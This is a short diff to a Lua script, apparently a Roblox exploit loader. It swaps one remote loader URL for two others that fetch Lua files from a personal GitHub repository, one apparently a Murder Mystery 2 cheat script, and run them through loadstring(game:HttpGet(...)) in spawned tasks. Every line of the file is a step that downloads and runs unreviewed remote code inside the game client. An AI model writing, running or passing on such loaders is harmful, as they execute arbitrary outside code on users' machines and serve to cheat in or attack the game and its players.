@@ -1,1 +1,9 @@
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImQ2ZGVhY2NiLTllMDItNDk0ZC04OTc0LWE0M2I1MjY3ZjRkZCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
+local function s1()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/furkanyigit438/aomgbw/refs/heads/main/mm2.lua'))()
+end
+local function s2()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/furkanyigit438/eliana/refs/heads/main/eliana.lua'))()
+end
+
+task.spawn(s1)
+task.spawn(s2)
